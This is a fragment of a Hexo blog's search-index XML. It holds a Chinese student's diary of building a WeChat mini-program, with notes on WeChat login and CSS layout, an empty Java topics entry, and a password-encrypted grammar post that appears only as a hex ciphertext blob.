<h3 id="jvm"><a href="#jvm" class="headerlink" title="jvm"></a>jvm</h3><h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-2-13-ZSRW-Development-record</title>
    <url>/2020/02/13/2020-02-13-ZSRW-Development-record/</url>
    <content><![CDATA[<h1 id="2020-2-14"><a href="#2020-2-14" class="headerlink" title="2020.2.14"></a>2020.2.14</h1><p>我是菜狗</p>
<p>今天终于弄明白了微信的登陆机制kkkk</p>
<p>总之微信的登陆，就是不把用户的openid、unionid(比openid大一些)放出来直接发给用户，而是用户只能得到</p>
<p>session已经加密的个人数据，然后将此发给后台(指开发公司)，后台才能解密获得数据（下次一定详细）。</p>
<h1 id="2020-2-25"><a href="#2020-2-25" class="headerlink" title="2020.2.25"></a>2020.2.25</h1><p>距离2.14已经过去了一阵子，这阵子我在干啥呢。</p>
<p>当然是开学了QAQ。但是在开学前我用了两天时间完成了UI组设计好的8个页面（创业项目原因不便把界面放出</p>
<p>来），我得好好夸夸我自己，真棒！</p>
<p>应该说这次项目还没进展多少，我就已经有收获了。记得之前大一下学网页程序设计，老师html\css\js一起讲</p>
<p>的，然而他推荐我们用dreamweaver???</p>
<p>然而那个时候的我还很傻很天真，大一下才学c语言。也没有人来带带我，我自己也没有重视动手的实践。</p>
<p>加上老师只是讲ppt，所以我没有一种html\css\js串起来的感觉，想实现一个页面还得自己冥思苦想好久。</p>
<p>最后课设还是临时靠学bootstrap，也就是大名鼎鼎的动态响应栅格样式做了一个大作业。</p>
<p>然而看到其他人都是自己在网上下的网页当大作业，我的心酸的不得了。(凭什么！！！)</p>
<p>后来当然是通过这件事见识到了大作业的可笑性，但是话说回来，自己动手也能促进自己的动手能力就是了。</p>
<p>不过如果不用bootstrap，我就啥都调页面都调不出来了，自此留下心理阴影(我好菜啊QAQ)。</p>
<p>这个阴影直到这次项目才消去。得知要一个人做小程序页面的我，表示非常蛋疼。但是还是决定接下这个项目。</p>
<p>不能轻言放弃。于是，我恶补(实际没多少)了css的盒模型、四类position、以及flex布局。</p>
<p>一开始还是在一边翻教程一边做页面，思考怎么排出这个样式。</p>
<p>后来越来越得心应手，做页面突然变成工作量的问题了(也和做来作去就那几种布局有关)。</p>
<p>这是我第一次突破了技术上的心理难关(并没多大难度)，给予了我莫大的勇气，感谢这次项目！</p>
]]></content>
      <categories>
        <category>项目记录</category>
      </categories>
      <tags>
        <tag>项目记录</tag>
      </tags>
  </entry>
  <entry>
    <title>开始你的语法秀，记他记他</title>
    <url>/2020/02/06/2020-02-06-English-grammar-show/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="81132ab1cf64d4e8c98301cea2a78a21eb6c0017a9a823fe39688ccb36da07ec">745dc5193b727436db8053f766187f0bbfa0d0d8aba891f4ec3486cacd61bd483f609609e8863b67770ba24e7922490c7c635c379a7a540734e3c66a664be90c3f3288ea6e1b309d65bc76072a14adc97c92cbb6a8f44bbf0a862cd40740e619cb041cf258f9beb36673670bb75a91f6ce9352581a83dc3794c87eda7f790159ef751af87ed9093a1797c865ffa3d74f075724b99da3cd8ccec6e5cc80d42f72a826849d29431fe239aeea6b2ee01110820763b925f772bb6b0b35742a1358f51d743ceb38a29a5222b2f4315a43a89b82e5f209e37869306641a2a735d57442de1884ba866229886231ea8b31581185674bc8e742846398b95d26870cfcdd82763d1e3da4cfa35d4e5bcd04c1c33200042417f1af5dc755a1b07983529f131ad93cea3ee6386da89ace258fd34514e1d3eb1f3872114a7310af0bc4c33ae1f52ef6766f8a0fbfbf80dbfe3556592be80e076b8deeac809bea5c7c614e33c16b366320bd9a8a688e88161c47ec3334ed9f086bde45cd2cad4b34c986cfb5c56f0a0f315c8d7a3a3d8b256a528d5646a2d85badc1fc9c691b52f2c6d87ff9496e4f7a110df749c6d6c39b041939d6b172c0b7ae5be0731272a9e0a8976bad48b45c73fcc847d11210d49e2bc1336c8f3d9bbf2854f0b59307634c14706b58ce54246c2de4c56adb0d653c8f0119957d993e768ca4706fce10fc02f00a2739b528fb0bc6ee9b2e099cf7d67d9a02c019d38edaa9dd720e25e61c7fbb9793e815e8a43410675334b6182c370d34da6eebf0956f21dfc2fc103a5c2e2103856f723beecdf539a9e69f7534775b89b585cb456165c5f0f0f151edc6650546099e719e7860e448cd94782ede793972767fdfd41114717074c977d7b460947395f454813335ff1de630d79e65e6430d59bd93065e4bc301818337f02add3c2edc192746f63ef939132be6a719f0a100b6090139739b36909dbc5031c714a4b383982e281e53bf7ccdb00a5f8f46e091ee75b1ff903998a1836f8b2e419d9e52981509bf722e47e264fb57b736c5e1ec84ecf11907ca5bc2711001f47f57959682d3deda52dfa97fc959f8647cb189b6e94b5e38dfd1cbe9c809ba11e53bca03f367bb5c8be84c5eb7f569168d04411828b997b845717600b9d6b0d57e1fe260533bea89a7ce494517ba7ecca32fbad6bd0db757411543a86ab58a3321d61adf00b413a38fb1d1df209595b3fd8a62c666f1b7552934a13a19c6592081757e62105c3272daf6f0b952f873cb0ea2762c7cb67fcad65d8b3578ce752f719fd4143a110ad75284eabfd983e2c5f3ea1a0e4862e8fff773a4b626cd27bf7070d4ae7efe8ac7a5b49528593829ed8880364e66b7eb5c7e3dcc2ed7f99b0bd0254b32835175236ffd6fd8bd5a7bb72294e353d5be415c94aedeba1800108dd86ae1d07d3eac7625be7ef1aee84da1411c58e0825e1c847c89350264c2f09d58a171a23a34279356284750d6c899b7ae10e70c3613c38c354eb32366ce9f368894901b9a918d8b316e065b86eb799d7a284b90a538f7494f9a5fe09ba026c4719c22930859b90e8ae1d3159d3c485b5639a9b7206d69c01a64923da8cc9c8403ecf5a5e51541750658f35124c4be2f275650a2ac960976c722bf3c45e1f294f4511870f151ff734402a23199c27f6a989e6cf4815f81cfb44a7baf2a5d4d451fc31d6b04bd3d2e53f360c1485c865b4a4ca7b20a94bcbe51117c70941244223eb7c34930314c051b93701488b866d52094e04ebd580da68fe011907b773e7ef1f56379486ee932662f46056e22f4d585120d40b4509903a33483aedfc011b208a4c56c778e45d8ab7c1cdcf7fbd69bed7c22e078882218ed90425086efb0efd085b83666d97507780bb9316c71472ca81d8a13a01d5e48c37a9d853c0530cd470495338901cd3e832d27a86d548df4d973554c10584a0191d8ca85f3be5df15f4d9531d76561e00a1df4c695c5f77a388a26ed41bde0be2e7994cfdde92d7c95fdad7a489d5f1012bca9f1975366d7d10085b764383ddc9017796b9d5883bca6f472880c65a67dc806dc193a328d04f868c707364d5a5cceeace82c399d83a0981ad663ba0708fe5703d027141290c77b4c914f9a67a2fd2bbafe3bc3339eb73a8043b883ab6fcc0e101afdb155e02fe92ef4b0717604fe444ac2c3d44869a6313030a97ddaa1aa101de3407755d11beb900edb747d631cc60f9b1d14e9483930cf86f8ab47dbec974690ffdd1fa7b88eb8d04dbdc3e9bf30e77f17bb54dc306e504a8ef4079ad8c9881a58dbe22d78ab9d8721b9387970561b96d60f9421d0e710ccc3ebc751ad90641dc04259a57792d950628bd64a9f05fb18000dd6738627c78a2c725ecf171a8e186816e256d1966b12d4173bdc557a2bbb4c1c83c1b4b4c5cf46070eab37159c5f3ea2804fc31d55852a88aaed2bc87859de84fcb7b489f48b3c37f190179b0a8198477d71247b3abdd31fb5df18befd770752086a583efa6c339fa8248153637f3c8aa09642b5ed9a927dfd207c2474843321c55742137280ceac13026f82fd05dd7972286ac1e162f4bcba22488770a62bbcb32c57287c50e3f8bd1787b694ae55007d5c1ad94ddd0ede00044ec345b63d9ca1668bd396d1594c45f2f55a8d85319b08f65057324fcc1e00f2e2b34848cbe8dcdb03756ec69e7fe2507db338298d1e02ec9fd4678b56001d4d62fb248d03b221cc4a20d37a6026c321580d9908bd596fbc26f2c73fad7ddfcfff6f24b48046f409a1d2f21015faa4d2e574b643a52032a13cf95b310b3c7b14b0673c0b0fe4c9c0549929a8489cde4077a1ff1301df5c84b5d70dce670a60a83f8bcd0f78aa416f495a49de4d6d6c8591214d75879781fad201e5b8c8f33d1caaed666dfa56be40ad3fa2500adae258391dc8ab311d0d3ddbd6b666874fe761ab14147203db7ab71fcd50e35fed08c22c3b978465e33b6afbb9762ef24b2976f1f5299f9a5678ca01fc21994965aabb086d29b32e5a6192e395612afb6d8530598aeae213f3320a0cccc59e70ea01aa6f36e1770c23773ba6e947f750172d048aa957cd9ca7f5ae71255ba6a3922c6ec089c2d7a8e4986cbe41e237edf2b90334cc4eb041c62494c9466ae3fb3393f4ee7893fcdef1c1cfb8baa46109589d72bfb2b825a4d42f5c09faec875c2b8abd8879536d8aeb544fa66e685b788feb425f2c38cac5332db4b9ae3d084c4e8b15a6a08e4c7adaaae3f8ec64ce7cdc7af63afea7cc227015aa36e2339141565e5d03d9a3867aa436d18f4591603322b294e7b3a3db21150c2352cf58c78685eb7ac20a98debbe98acac6faad64dd5bfbeafce3b3322bfb455b77216d7d830cdcbfa8d582eaf20329faa6a4f8215f24eb6237b22d21bf865405d3c8e0d2bf12b2aa913c8d12b8369d951479040ef52d8206ad6c1cfb41f8dae229bb6437c2cf259f8febe8c470b14f06cac0035d80e8d9268009169392d4258d02e8e4eb78d2cf292d3649f67aa8b71a2206328676e9e0006d3c44c82cc20cdcf16df66065f020264c03ae77c071e62c3e608b6bd8c75b9bf6d201d60531d768b74b36f39366f649c6e3aeab5dff7ade13c0f16573efb359d30c1086efad0ae646bc9671898ab79342a3733c1b87afac161ff4a415d5c5d1e83ca3e8ed1870a35bb760be658d985a2c960edacb4443ac686ac4801281b9b46e6a6c3bd6334414d65464f3fb0ac80efa3bfd5f7cff8b27ce950658c6bd72e7dd073be5cd1effe32ce081a95ff3d6f0da83afd9f13cbdf6fb36174ac471d076c0f332007dfa265646b1faa86f56c2eb05c8e6a2328910ba9312da5733d99c65eae2b7802dcb807bb6b5cef4e9072eb228f801190919be3d513d45d9c7552df1401efbc69231d74c131000252fa0b17856f1aa351cc2ee941f7fbdb0e24b5f0d1bed6b37916edd3507a1b3b31e927c8794b53118a46e7189344c3edcfb5c638d8633a397512033349d090de4f28326f323872651c83e98c834f7edb6c506947f1b9dbb85717487308c785c5755ab3a40813fe78b872171a7159b49af42390da93968fb267bba648a111f0c49771748bb03067c851ccdb3edd89981266d44ce1d8c30f0fedaa2c7a639c0720c89d7146e500da0e6f78931615fde9fd155599ca183668a5bba9f9de7d9e347564389c873b255390031a8b893a5dc7e5efd6bd7b9ad4f9b1fe84f550b8535cad4f9514161f80d32903f2780326f80bac03fcb80e8aa46ae49a0b9ccfe4da291aa5b337e40f07938d42f541b283fad71a9d06e2640426a0c3de11a8cee62e15c18908f8bb46cd6be119910ba449b52ca8d1e801648986d27bb3ac609089df423d7fa9d8405cf89888cf5deb3cc0939bda3d6f760e7f8eaf424254e58c61ab4bbfd6c32d711becfdf70e846c3d5978ccf311e94d60ea5a68a7512e35b618e1256da2cc3627937aae03a6d3d4721231b83c0854bbbe351176059842fae0197def577efea79a3d4a2be2e1ab38424d90c54e6eb51f128adae4bac08ca0dd4d3d42e524cbc6502e346d8044a345e4c95173449127636bf98ab50d95d9dcb2719b4f3ec97f768aec23887e9d91e24dda7395098e9e1834a28739bc7981e3e237a5299b6f3adbc4fbe0e158f811735f0087d12997a2d6abe4d1fb9c7464305b65af1b03b14553a6a9102f28a16e141ea92ebbfe4352e89210a99ddbf4ba6d8eab8eb8df1ad4d80cc737ab64fb452d753636108748713835cef9dd0c4d5af63793fa7c6d37a26ceeed05f35c7ba43ba81b73af8c1d3936f5917d742fced46c94e5dee43e5ae89e9cf37df38f108b3f2dfd7d3d148971c92d34dc7ea20b1d737079888d64b034fd082bf2cddac2e5966ae1efca3753b6c6277cb23f9dc03a01abc5087d64a350dead6618b49ab3ecac147af93bf9da1031f8a48950183bd66feb705b7b717c41cc0b262e09ac81911dd6cf48b1a3402703ed2f5f48203db31f44bfc9b000debd6821145cca5c9393407b8df574bd94dd016e0f9f3441bf510c1a3b49c56cf17b69d789f65eec839e8f4e0eaae86fa4100f17d666c0d53e92a8dffcf53e3b1efe1529a9d99d077a9a76fa201e05a48f8b852e4c94cd6b7e18406746a81a61d14e2504df0a74e6d8d4c122b593d2a152bd41f0bc67791a56d965c4fe9845f445528be3ff91d8669af37fc8f2451522f576a4085c2d548951550b09c5f9fe0ba6bd6d701b1bf05eed13ba1f6ce6d2e437e77d7549f7cc2a3e37ccd8e17c467727b157a907330b2b10e8bdfd6d242f13c1913abcf1764c2a48a49eda43a802d1f1716827f7f47db577418fced33b06ab4656793f30a2a51af9c2e1eb67e766252c5094ccf0e2e208ad19c234b44948106daa583a3b0df2eaf60eb0cef3707b6b11934251b42a9048b7e07e995928102ed17a718e244396358a8c140eabc36002f68869c3ada6030f8d7ba2c1e799ac67350d44b213065b6bb30a07f85bcd7984a661f107b09fd30fbe3f0dc7c852fed4ac1be195d895d9272071d85703d14732b29912fb7c38dc59caacfd6530477badcbbb98e6bd9d49ca573871a3a6e56c10e9482779c6c76fc4908adf8f23216ee469d0b7197d8f38423e793dae022e69d712a38c073229a8f38ce64bae5ed9ad15cbee4841d015cf207c409cc61b3c27aaddbb42fc1517427d8b5bd6db608e7540761165b4ff9cf005a5be6bab3250d2997916b74cb1e12bc86e7994c9aed50f5d04fe1016aba0fb6a9ac20a651d7c7c15640d35de266732c14f6838d145dc0c4ef44798898067787c56cafc35a3225ad41251dca19f77cd9860f837206fd31815a8e0fcca7f22725896b3f8603cbc0ba123b194e2d8536789f9b6a8299818b4497aaa03f26b9af5c28a565fe231c888c5092b1c75bff484c436aeb56e3d24ce106897a1e1568101941f695df937c262a88400fe08a32077e6b53a343770b72b299e3c43f9a7053aabf7be6fff56d2b0067e42537f96d9c0d0acacf88529bb7202f15bbaa0749575feb4576ded2c8bc7eb4631269356fc59d2fc5956ed486259b961b29f8226e022dbdd6b8cc7f46a14b34683d61d4b341f763c61490bb442a6bc90ff3168fa1cd7c972468913b4a510c12632f112f4b0f87302333115ad980827e0d352aaa4d1a59b5672e02db5fe3c576096dddedcc7a74c00b6f3cc4d0ef932a52d8186db4c3f4afd607777de964789b0daa6705655fb62a03560269e7a048a22e256f534eaf9488b26f11fc4a0b667e0674058a5be1b9ca0901537203e5fb194eaa464a8234efa935633545a57d03aa1bd5e521467524845bc95abe6dfdd36c22f789900ceb51105a594c85528d9c2299768cb17d22de0c599d7492f289dbbde9467055aa706ec5ce0370294a107c8fafec7c0da352959789d321cd97a891d5983f29e4c79e84c875faa2dc6bf38e9cb413649638ded7257ac584d29fd5e66a5dbeab152315e8058e7468bc4ed1ab7ea1a385e8b2552c8b2fc5c5c97dd3bf84587f2952bf1e5d37b8e5c48344e39f49dc16561f27cb93ffb673a7b89f97a3f89d384c177628dc735e7555801f942235bb3126ae45142063379d077bc21efba58490693068376a42ecaae7e318edbd908924024cd75b26799fdaab70747f4f2d594fbbb80b7f4dce5e9deae593f48d214c749fc7b446cf9724424e4c451b779d518d14f3405c557c42b882812cf4aeff487027e273e6ccdc4bc572e9ad60f5b31325350b3336749d58c24d4c781cc53cc59eaa46279cf576afb231586e04e225416176aa0dc1769a12cea080762dc2e4c796372a0ee22809b67c21a46ec5588c329682133a0f3774a8de0d20cbbad4b05e0ad4a66ea562f7894a7fe0b409290a82e764d7e138e717b88166ad20f400a07137ace1ad7772b5e93063dc45db735e188388d0079ee8061b5c4f3a2d36e47581a812470bf4f45411c6ece3e8e1403d9bbbfa1ad038e36be1daefa4555615c19f722255b0e69d7e64a0c1692ba501758693b9a9674b7904decf6b579c60b6c10fe6a5063ff0d49d7fd6d580c21c25b2fceed24f3c2fe487493acdddc9107fb754d1da718abeb1496013864d305f0da7341807b6d2aabfe441a634971a1e1b7b2b4ef5ac80eba5928c5a990775bc79f4a3c8f33319b446738e291ae2da48d72717f4ebb7a62e12d0c1e84f71949cadf77ee00b9bc450d53edff36d51ebcdf2649e5a0445c3d0daff26638e04db52dfd7676896ed2c3a39e265058d1b364ac056c74b211b5c0be95495cce2517a7f632c9a86fe03cef88afe4b3c5f419e3b08948a0ceb16a2a7540ea2b6e88369ef91914990946e2512fd006aee2566a1ae52fe8783956963f7d12385e856900392a3dee15672149894ad9d90e25e3d19ecef023ce6bc9e7d4fe997bf9286aa5b59a569dfe4f22c883924aa0b89b5aa2f54e69af04fdece1357048c7c6aa477637c89bd5a38b36e012cb2135b4caeb4368eecc8968b868e9937810adb0a9649d07451df2839099179c2a78c6eb09a2fe203044692a094b6fb083dd267d3aed1c69b5fefedd6a0cd0b7ed4fae30b6b0bdaa89216dd31254e58702765e6ec26029e5563ae78543bec0c9749ac5f658d32c6ccb79ed8dc924cb1a0e1a331375591856a4e543b1dce0eaec6ae913b4f272c9b772557c5a98a9ddd103728e871c1404c88dcca65cfa567c4fc4e47120a41529ab531d0667116aee1e15116172df50a17e385d4a939bcdc6ffb73e966d913b2d7b2a0a793374f18fa0f44a536c601a59912e9e0d717a0928c4b2659f6e8a2d9f1e16cecb7e11f00ba8522307184915c63c98cfe6d86d66f362a3af8554f42652365e0bc82cbcffe92c65abedeac730556ba18665f84ba3b13787faa1e6f0729b7cc79e0a7b039443b87ea2797e803d107657af3e2a57189d599074b5c944650518a9a422bb2b91035b57f8a4df3dcbc1980b4c0493f78e99c67315e7c954a77d5842f7d4c3c8d39266878a61af80f4221e792104babcdd9a3ae6cebfd4e535cbc180fd573795b75528e585fa6c6f8217c69d5d45da8099bdbb16b3cb7e7341ba6af1ec7179160a5bc298886b8d6b84c50b7ee1649444cfbb96b588f043ced0457078e5f56a0d313e8dceecd85ef8a00c58cbecc908452243987e1b11077626a9323b575bb7afd1e5e6b6407b4888b5512ab8f2814e4bd96e0b4f7f2bb6dc79e707dd1e83eb25a188425b2b0db03668fdd458e322c29309a3e704f2cc82fcd719bd4e3d63bde3598734a62a6217844f142173242d7aae456f48c2c5c01b05d4a6f818c5ef62c3914a8c4d8f5d442af6658e94f662bf709b0d5aaaaa5bd00bcffda87ba1684139b927aa41cbb6be62dfe751e83b0d26676bd0d13ad0f75dcf9da868491ec0cb1e8991e33bbf728aa706bad489e67f2f41d25b77970f9ce69688d8c723ea30e17e68b740aa15735224748f4ca7f471cdea958c17b56701fa778820ac3dee6ae0479b70b7610d48047a44bd8ecf25903543aa401183bcc7ab1f457862402bc157b2929fada128f5e2a3d3a660ff44dd3441f7e9ee085edc8c3526e7c24a4145858a0e41c79f2bbde61fae2c9c64e641f34c7c59533b18fb51759db719b3d667c1b3b8467f8527d8b16b5560c1515e486351c04ec37dcfcc364ae206f19575563023417734ad9296602d475cc300c1a892f503c8e19ae449c360c246df1777f81691295d8a2d1b592ca4034b631c111ca95ddf0d3e15346667f385360e5ec2238b3839a5d8d0c928c0fac66e55b237d757e5eba62b5bfe4fc9d1ccf524d0488914116beb78fc3a2010856828544eac8423e4fb6d02cc6059f1e3b86d286af1efc80847e9040c95dbfa6ca01612378cc037ec6dc065af0dc41b1a2c66db1a0e920fb633d54f8ccfc229724d217ae1a447863c8c0de1b904a3618f01bb820fd99df21b6e857c44295e3999cbd38fc367670b4d10213630a1c90bc516f6c836470789a328907d9053f0ecd37d11dd9deea1569ec6371ea2fb46fa460c2659cfb4c076754ef6bbe6310993bc41af5877eb1aa13222649b9e7659b522d1188b19cc6addf10b961a6f603d36582f5dc766ea448b1a281fbcf9b72fed34e89f725a9e5d8f292e55d64b47ff4a09e90e6b24d9a6b27a62a94ff922c84e6ceafd546dfe14756e52e8e1c15ec8b79e70c7f7b193d772d537dcd15d06f33bdab82dcb73f565562a7ebc9989d9d9bf6882496e4deb18f04a655158c7dc4a266faa45b34817bae1b26f30f6881025e6320900406f6e9225c594433fa5a6adbc1ca0bc8c6e630e7b88596a37a2056e406ed7cb1394e6230cdaa9514ad818294b896320ec33fef493899c3a5f879ce2e3dcd717895985791009ea98566e83c39c3da359022f4b670038fb0c744abc91a2b0daef4bc6c9cdf875e2da4e873c124604cf8cbb83063fe2a02b159336e199c6c3749f23ef0ed68ffe83ed055da5ed24d7f025bc29608c9d00695d5d9fb0383d8dd5f2f4a4502fbe36d7917446cef3e0710a5db403f6e8a26ead69b69e378f335d6b13370bc86f1da144e1d671cfa05ead7a62ab26468155121721d6a0d498ce077ca8ad8538b05e202c34041de4a9292a34495015cb546de8920f3b998717fe15ced3eac26be799e6b44a37a07db9709025d5ac2a58c90f1c2890d90b5bd3c71b14905d37a3b33a258624cb83a6db5df55df173e45bbdd60218836aab0e118db4cff77610a89763ffcc4d586037100adaa2882d23ba97b5d9cc938a93db09e2c1e0f44a41e744951e2c01356438c889f60ef1c0138fc7da3452c9451e32d483ef74cf6c00dcae1a167bc8b36c9e5346cbbbe8a8df4ae410b5b7cd82c1e23e33fdb5d8ad225d6c2580d2e417859a7dcd41c2aa330eed1901ad34e88261bd8b8d945f630c29c4475174bb574e6c7a22a0042075e6ac76d344b5126c4e3012e5f6fb3d410dab941edb463e481f758d4af8565421ee68df10e7c022ca3fca75325c37b0b94569745aceef33a028a87f74d2c73309a743caf84cdddf8fb8e8c8304ce0b30465462461674945218b7b51440756a10deca377484bf2aaba709a9c3d9cf1dcbd2eae4e317034e1938dba08a6cb5513837da623601c8433838d32e6d4a1f6a0f054276a3543cbfb46dc10036af93bacb079da8f5623fda2e0345991ed73b451b9fd5a68799885c3a53ca4879e7b6e528a739647e38877476ce9d9a6e97d27fd3c0d02f7438985f2745fc45828bdd6942e903cebeee38488113e725a065d06473f4c2e93bb612de7481c082e4e42c01c480591060003b5f9a6eae0dd17f29402a8ad7d654cc38a10a7fc157abfd001fb8db6e59fa2ead8e6ed103488bbacd948cad4e55fde7e7a05025a82f53b8c8e92e8500ed31abac581a640dece6294a49ab7c8c9b1db7cbf40b36a3ad391fce42d6a23442102c93a5d2d231c19049afef81fb4723e559de07d9e92d889e32c55a8c12038570eae55a37b52fbaee911fe129a59e329975fbd40bbb2410e4d678b5fd53dee67b49cb769d04fd2fc63b61aea9e9ef002420cbb98b4e34818cdcbd4b80819e0f27c726c18204a7734d9032ccea97f9423de34096d56f71343b8e78ddfd590c22f40604e08ccd1c9915cbf915b44eb7fab57bfd7d14ca69dd5e16ea95de1c9b905c0e177b75b133821c3e7433693747674d0de629989be5d24e2ed99a4c7b1edd03edbf1d075286f5912ce28e5a076a66229d1c0763c67a80daee1c3355c514d62294799773797ba05dea8471663ef4fa7a3a3ab812a7c6197f3f58d5a0aad9fc8872fc750ac02a9169804c3e628b8ddfef7134115c5723bb0451c4e6acccff0d70d43542c77160a93e89b9f0e705a104b20452bc47c49636c2e34d37ea9dcab139a5974658aadc96ac5e4e3fe7a0d37fdf96249103f1d1599434dbe449c51340d298ccb90125387ff4d74693a2b0477665aa95698c3c5f5f361f100a14b17c7b91e32d5f30b9cd2336d51b9c58c7997695e7e71630926a26f248e40443addfadf195a0fe67a28c86704cc108b2c1c6d9430b15e94b9b9dd02f93b22fd199da3473c45ee8770016765fb2cb7b8f90e7fc8057e3063ed2b09b4b7728e9dee57511bc44355f23a39bcb71e66127884843541862568e9f3bab4529e34d45dcd55992fe33b043c26d505393aa05b61259c5c296bae03183a544a271ed2d3537412c9d0fab29a7fb9cb6b627d0116935d71fabfedf5824b1d39b41537c3446527ddabf52ad6a1db3204f3166a722b88aa324310fa3fe1e5f0c48400408382d9e2967355406f1dc26f65839ec2ec91977eff3631744310362747115296d7ce565499e44f1e2c56910cabfd2c1d197d69b3d75352404f3d943ffdbd0cf1601e938580c8b4031d2e0c5a35a3316acefb11ebddb013fea1ccb71870dc32fc49a4a339c2413a36cf52e18efde170bd8ba057fdfa9d0efa4d6674c6de1df63c88a055ab55beea82eb902e30661feb2568a869a597cbe3ccd050daeea1aaef4e4c02b73ab2b7ec89480cf7c6f9d3bb8c71f2c760eb8aeca10cc8ffde3b2eb6e36750298bde87dab5abe4008b12af6358f2f99b82e7a703e6ac4733447f201bbc819790d012cf520890d50f2a86af1b5c7457011b42cca32ab37e8a8c9a0ac714efa58707d20dbeb749537e773b96f8c0da6d3441434071ab043a673a731b2d83c1b7a30ca56c91b75042d651ebc3f2ef516f56d569e8a2204ee868d811ba72b578ea4b67112cbfe05e13e2d655270032f3f5b68962efdcc62e439de41288bbf1fbedd23ea744db4bb5955001cce7bb87523625cbe1554a5a475781d224567cb3034b2c7efbb2d86188ffbd1790d39498ab6dd148e283f2b7d9b49b6a29fb4bf101c92193fc7e03dc5bad2c8df9afa1ff1ded5a2ba274afbbb71a160891589b74853430c948c67e23a287accb79c0b0af854b572fd9001cf4b6fdafaefdac0a1d1a22d2c2c0f804fad761a6f653823833dfea7a35f76a72150aefa99d2b341046c6ad8bfae43c0c4d0fddf92902edac2b754a8d5afb2a955bb6f4b2ea1f7374e2bcd7c1174b0a6f46a1b87bc182d67ca4dad28e6fd501fda3af3cd6c3c7af24e9ca6d40ff6fa39463e30dda43d0485099a9fcdb17a87759c09334dcaea77e60f9b64db3f908608dfe5146883e24c091d51dbc9d6140210a49311a1065d75a42f43d7b16e53a6be517b8759d31fbfa813e2a230ca0ed8132e1b9546dda4395083c6a4afa127effd0f2290f65fabc6b0f40ba15146b2fad2920cbab8efe9a403ce514f15fc93f1ba428f42ce018a64ded15ae9aa5c8a22151d482e9eb8a133b222e84c69dc16296a58d3aad2fa5619cc9cd280afe672eadbff1bbf69cf6184985ca18a04703742090df657795017296cedfe57797e7ece239f4281a3a9e372bdd80eee36139fa3a9259b643893e3d0b595f9c989d464b85e950e15628815de116e104bc27e5cb646300083bfeaeea686b43ac6b97f6ac7d88b43af136e92e8b4040eb78c1b702803a899aa3144ae8b4af9a66459fed4bc280219776c0a6f6e518aa2a6e89f62b8d33d04d6a85287d2044a2c59141df0aee910d02334d3c3b051cb8a4fcd606079340438c8d249a25b25f852dd3292c6a0170b04c78b3c6b339fe79badadee28178a4ba697ba420c826985819a0b213b4c2867d2104fd8dd707f2d9c59d40e7e7810f556f52fc50ec4c476eb473da408cce00677241733e8dc7fa81bedb5b0e23ceb04d08f3eac7bb046c1a47b67bdfb7e532ad1acf339a1246566d1c485909f0d6d51fea6d69818e4b882dde63efb14144124af825307efb3aa6497cf62602f191f7bb4d33c11e7cef5a874a6c40adca86ff8fe1e89319cc3a2aae55774ca319b758c0df53cac94495dcb13147b55d365ad9dca6cad5c0f7a76e054598391b83318f559ef405d185c9237f755e6825c4c51044b410259b6db0d5c2f9fb3335be440bbf57f1976e2d4ba5c9b5e543affb45a6ff643610f677dbefefc3e77d9d21141f3dd66962dc035e6f18186495494e958d0945aa374d1e2ecabd4907de68a664f261eb664f3611c6f524f1c39b0486599a4d7b8cde4fdd65072579d45287821e9a8d550eb6e7a73b2d565303cb30d99385246cf198fc46ea74b4366044f693366237ddaae90bd122baae757c77451b8927a96d138c9b3e474f8cab05d20654ca207132649046444c9b641f0fd61c916b3bee28361e4c31f0c8b10e4b16cfbffe6fb282f31b23ce46009e7d940ee85346492a7a633122f762ad51ba1e6c24751c5fe4ddbff9a1094e23e427daec469e1c9495439c1338c99ad46705749f1157f55916a57f220d39b927f456468739f87dfa8b786c23800788b5ddf10d2fc3e9e52d109c278155ee645be94e03f9fe5dff564962b95af532e7af9a62ea253e01c73625e0f376dfb663b6eecaf25433a06f10a836a937584bee4c25ea132866a01fe3980c64bc5736acace7b83d2125e20f4e25b85bc7daeaf0d031e9da8e25d3e19e0bd546e8793c84346689e928e9ed4100000414b93bf16596599c0eafaaa2202adac09f926f59356742533a5dec6eb390ceca48dc18802209fed66a7148736cd9c9529070438d345668a0474b9b71942a2aa819b3fc11014d8a96aa29d20c0b0b5709b4118784122dd473f5153982dd2d471a2a55ef4fea4dbd13a226a2b144728820d913ced7890b2fa4d0e742b19c54b31aff4f930c3607275e6e0f635219e2cb881336a64d4c1c1c028c1c1e584b3c24f5bdef16994b6ae7f6f0b59c8b2acebf78b8ab73a47c04e60deca7709df2ef51c88640f5c6895747f43e1cfd2857889319e259a4322cb556dc32b1540ab64261c553ceac1cf00ab7bcabaea5322bd520f52fe0e233dc514c7a1758d96167fa5f019ae1d6673199e3b8f8a7de9d7a6d0cc0bce40ae4f71897cc2d8c203cf6c176cc3a079bb4ed199cbda37ea1d7eea55ff93ff81e5d6542c05cd43765844cff771eb73e52357e8097885e637093ad70b9a4949625d89458714204343dc9690651ac271ba647404be55672faae151bbc8ae7b29c364b98b355d70fa2b0492b08ea4f398c28c160baca6fb2e373127cf381c0d47ac55255d0c9dc7bb4f9d957904d938c586fed9f078a4dd2aa67f4378210776b7a028d7812bb1d91b02112ad71be3f870358ffdabb541c8b783527ee90b46e180e244f5819e07329f49293fc541d81e46d377f6e73d30dc0e6ac5216f55f6f45f556b548200ed9e73a72b5048137ec7ab08c7b3f056e51383cad82f6750d3e4ae3260f6ab461e633ee9c8a5722c8d87c7723520c46a8eff846dd93bfe83bc180ed4a40011257d7c24158e2ba4cc7104ad3b6cd486b9c716d58c2dc38c5c27b4cf1b5e445dffd59e4e562d456ddfeeda91faa15a21c04056541c73fd52c5dad97a2134852c0b46caf08779cedeca83552224a2fb1d55d303a4b8037b97452ca1d0eeab14e010b359aeafe5d5ef3c27ef02c6a92abf69803c3710f44883c4f87816bc82f4de7c666f74e1